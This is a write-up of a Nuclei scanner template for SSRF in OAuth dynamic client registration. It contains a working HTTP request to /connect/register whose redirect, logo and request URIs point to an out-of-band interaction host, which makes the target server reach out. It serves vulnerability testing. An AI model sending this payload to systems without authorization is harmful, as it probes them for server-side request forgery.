# Nuclei Template: SSRF due to misconfiguration in OAuth
**Template ID:** ssrf-via-oauth-misconfig
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Medium
**Source:** Nuclei Template (`ssrf-via-oauth-misconfig.yaml`)

## Vulnerability Information & PoC

## Description
Sends a POST request with the endpoint "/connect/register" to check external Interaction with multiple POST parameters.

## Steps to reproduce / Exploit Payload
```http
POST /connect/register HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Language: en-US,en;q=0.9

{
  "application_type": "web",
  "redirect_uris": ["https://{{interactsh-url}}/callback"],
  "client_name": "{{Hostname}}",
  "logo_uri": "https://{{interactsh-url}}/favicon.ico",
  "subject_type": "pairwise",
  "token_endpoint_auth_method": "client_secret_basic",
  "request_uris": ["https://{{interactsh-url}}"]
}
```

## References
- https://portswigger.net/research/hidden-oauth-attack-vectors
